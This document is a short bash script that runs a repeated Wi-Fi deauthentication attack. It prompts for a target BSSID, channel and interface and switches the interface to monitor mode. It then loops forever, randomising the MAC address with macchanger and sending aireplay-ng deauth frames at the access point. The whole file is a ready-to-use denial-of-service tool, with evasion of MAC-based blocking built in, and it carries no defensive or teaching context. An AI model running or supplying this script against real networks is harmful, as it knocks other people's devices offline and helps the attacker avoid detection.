echo What BSSID do you want to attack ?
read inputBssid

echo What channel is the BSSID on ?
read inputChannel

echo  Which interface do you want to use ?
read inputInterface

sudo ifconfig $inputInterface down
sudo iwconfig $inputInterface mode monitor
sudo iwconfig $inputInterface channel $inputChannel
sudo ifconfig $inputInterface up

while true
do
	sudo ifconfig $inputInterface down
	sudo macchanger -r $inputInterface
	sudo ifconfig $inputInterface up
	sudo aireplay-ng --deauth 5 -a $inputBssid $inputInterface
	sleep 5
	echo Starting Again ...
done
